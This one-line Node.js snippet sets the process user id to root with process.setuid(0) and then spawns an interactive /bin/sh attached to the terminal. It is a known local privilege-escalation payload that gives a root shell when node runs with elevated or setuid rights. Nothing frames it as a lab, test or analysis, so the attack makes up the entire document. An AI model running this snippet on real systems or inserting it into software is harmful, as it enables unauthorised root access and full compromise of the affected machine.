const child_process = require('child_process'); process.setuid(0); child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})
